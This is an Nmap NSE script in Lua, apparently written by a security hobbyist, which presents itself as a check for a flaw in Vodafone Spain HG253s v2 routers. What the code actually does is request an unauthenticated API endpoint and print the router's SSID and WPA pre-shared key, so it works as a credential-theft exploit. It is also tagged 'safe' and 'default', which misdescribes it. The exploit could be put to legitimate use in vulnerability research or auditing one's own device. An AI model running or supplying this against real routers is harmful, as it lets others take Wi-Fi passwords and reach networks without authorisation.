-- The Head Section --
description = [[Script to detect the pre-schooler vulnerability from HG253s v2 Vodafone Spain]]
author = "@vicendominguez a.k.a |QuasaR|"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"default", "safe"}

local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local json = require "json"

-- The Rule Section --
portrule = shortport.portnumber({80, 443})

-- The Action Section --
action = function(host, port)

    local uri = "/html_253s/api/ntwk/WlanBasic"

    local options = {header={}}
    options['header']['User-Agent'] = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"

    local response = http.get(host, port, uri, options)

    if ( response.status == 200 ) then
        local body = string.match(response.body, "%*(.*)%*")
        if ( body ) then
          local status, info = json.parse (body)
          if ( status ) then
            return "  SSID: "  .. tostring(info[1].WifiSsid) .. " (" .. tostring(info[1].WifiBSsid) .. ")   Pass" ..   "(" .. tostring(info[1].WpaEncryptionMode) .. "): " .. tostring(info[1].WpaPreSharedKey)
          end
       end
    end
end
